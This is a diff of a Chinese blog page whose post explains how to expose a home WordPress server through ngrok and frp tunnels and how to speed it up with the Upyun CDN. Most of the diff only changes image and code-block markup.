-<pre><code>sudo ./ngrok -config ./ngrok.conf start httptun</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-4.png" alt=""></p>
+<pre><code>sudo ./ngrok -config ./ngrok.conf start httptun
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-4.png"></p>
 <p>通过pi.ngrok2.xiaomiqiu.cn访问本地的80服务</p>
 <p>之后就可以更改wordpress的站点URL了</p>
 <p>之后就试一试通过这个域名访问吧</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-5.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-5.png"></p>
 <p>后台返回200了</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-6-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-6-1024x549.png"></p>
 <p>可以看到已经成功的实现内网穿透了</p>
-<p><a href="https://diannaobos.com/frp/" target="_blank" rel="noopener">frp官网</a></p>
+<p><a target="_blank" rel="noopener" href="https://diannaobos.com/frp/">frp官网</a></p>
 <p>如果你有nas是freeBSD也可以用frp内网穿透，有freeBSD的版本</p>
 <p>这里我说明下，因为要付费才能用别人的公网的frps服务器来提供服务，我就用自己的阿里云了</p>
 <p><strong>公网服务器（如果你没有公网服务器就使用别人的，这一步就可以忽略了）:</strong></p>
 <p>公网服务器要用到两个文件，frps.ini和frps的sh文件，一个是frps的配置文件，一个是启动脚本</p>
 <p>首先来配置下，因为我要实现的是80端口的穿透</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-59.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-59.png"></p>
 <p>官方的完整配置文件里有详细的说明（这里只是一部分）</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-66.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-66.png"></p>
 <p>设置建立隧道的端口8085，让服务器监听80端口，映射本地的nginx服务器的80端口</p>
 <p>别忘记了要在防火墙设置中开放两个端口</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-61-1024x69.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-61-1024x69.png"></p>
 <p>阿里云的控制台设置的</p>
 <p>之后启动，可以用nohup &amp;做后台启动</p>
-<pre><code>/path/to/frps -c /path/to/frps.ini</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-62.png" alt=""></p>
+<pre><code>/path/to/frps -c /path/to/frps.ini
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-62.png"></p>
 <p>成功开启</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-133925.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-133925.png"></p>
 <p>成功开启</p>
 <p><strong>本地apache服务器的frpc设置</strong>：</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-67.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-67.png"></p>
 <p>common部分填写公网服务器IP和远程的端口，用来建立隧道，以及验证的token<br>下面部分填写本地的IP和端口和远程用于映射的端口</p>
 <p>之后启动客户端</p>
-<pre><code>/path/to/frpc -c /path/to/frpc.ini</code></pre><p>无论是客户端还是服务端都可以添加日志</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-134001-1024x83.png" alt=""></p>
+<pre><code>/path/to/frpc -c /path/to/frpc.ini
+</code></pre>
+<p>无论是客户端还是服务端都可以添加日志</p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-134001-1024x83.png"></p>
 <p>可以看到log里面说明登录服务器成功</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/Inked%E6%89%B9%E6%B3%A8-2020-01-30-133948_LI-1024x51.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/Inked%E6%89%B9%E6%B3%A8-2020-01-30-133948_LI-1024x51.jpg"></p>
 <p>服务端已经看到了有一个客户端和自己建立了一个连接</p>
 <p>之后就是测试了</p>
 <p>访问我们自定义的域名，<strong>别忘记了域名要备案并且要到DNS服务器添加A记录或者CNAME记录</strong></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-125141-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-125141-1024x549.png"></p>
 <p>成功的访问到了我们的内网的博客</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-125209-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/%E6%89%B9%E6%B3%A8-2020-01-30-125209-1024x549.png"></p>
 <p>资源文件也可访问到</p>
 <p>这里给大家说一个tips</p>
 <p>在安装wordpress要你填写主站IP</p>
 <p>那个IP就是wordpress所有资源请求的入口</p>
 <p>我碰到了什么问题呢，内网穿透完。可以通过自定义域名访问到主站的index.php但是却访问不到资源文件，而且设计到的提交表单等服务也不行</p>
 <p>问题就在wordpress设置里主站IP的设置</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-69-1024x488.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-69-1024x488.png"></p>
 <p><strong>设置在这里，如果你是内网穿透的话，要把这里改成你的代理服务器IP或者自定义的域名</strong></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/frp-success_LI-1024x135.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/frp-success_LI-1024x135.jpg"></p>
 <p>frp后台可以看到建立了一个连接</p>
 <p>当然也可以使用frp提供的dashboard仪表板查看自己的代理</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-68-1024x576.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-68-1024x576.png"></p>
 <p>基本上想看的内容都有</p>
 <p>基本的内网穿透就完成了，还是很轻松的。</p>
 <p><strong>用CDN加速博客访问</strong></p>
 <p>下面开始最后的1/4之前，要有台公网的服务器和备案的域名。我就用第三方的CDN又拍云来做例子了，用自己的博客来实现加速</p>
 <p>首先，又拍云是按流量来收钱的。所以大家用的时候要注意哦</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-70-1024x530.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-70-1024x530.png"></p>
 <p>价格还好吧</p>
 <p>CDN有很多项服务，我使用的仅是域名管理，回源控制，和HTTPS</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-71-1024x615.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-71-1024x615.png"></p>
 <p>添加好自己的域名</p>
 <p>之后要在DNS解析中添加CNAME</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-73.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-73.png"></p>
 <p>帮助说明的很清楚</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-74-1024x36.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-74-1024x36.png"></p>
 <p>添加一个DNS解析</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-72-1024x574.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-72-1024x574.png"></p>
 <p>回源管理，设置资源文件站</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-75-1024x628.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/image-75-1024x628.png"></p>
 <p>HTTPS设置</p>
 <p>基本的设置在又拍云的官方文档有详细的说明，我就不赘述了</p>
 <p>之后就是ab测试环节了</p>
 <p>没开启cdn</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/cdn.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/01/cdn.png"></p>
 <p>开启cdn</p>
 <p>开启cdn之后提示他的CNAME域名没有备案。。。真实无语了</p>
 <p>阿里云也有CDN的服务，文档都超级详细，需要的小伙伴就去跟着步骤走吧。</p>
@@ -1120,7 +1158,7 @@ location ~ \.php$ {
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/e6-a0-91-e8-8e-93-e6-b4-be-e7-9a-84-e6-96-b0-ef-bc-88-e6-97-a7-ef-bc-89-e7-8e-a9-e6-b3-95-e4-b8-aa-e4-ba-ba-e5-8d-9a-e5-ae-a2-e6-9c-89-e6-84-8f-e6-80-9d-e7-9a-84-e7-8e-a9-e6-b3-95/" data-id="ckqv2rh1n0043esvsccvba33o" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/e6-a0-91-e8-8e-93-e6-b4-be-e7-9a-84-e6-96-b0-ef-bc-88-e6-97-a7-ef-bc-89-e7-8e-a9-e6-b3-95-e4-b8-aa-e4-ba-ba-e5-8d-9a-e5-ae-a2-e6-9c-89-e6-84-8f-e6-80-9d-e7-9a-84-e7-8e-a9-e6-b3-95/" data-id="ckqvbhfvs003rbwvs80u64vjx" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CDN%E5%8A%A0%E9%80%9F/" rel="tag">CDN加速</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTTPS/" rel="tag">HTTPS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" rel="tag">内网穿透</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB/" rel="tag">动静分离</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8D%9A%E5%AE%A2/" rel="tag">博客</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0/" rel="tag">学习</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E8%BF%9B%E9%98%B6%E7%AF%87/" rel="tag">进阶篇</a></li></ul>
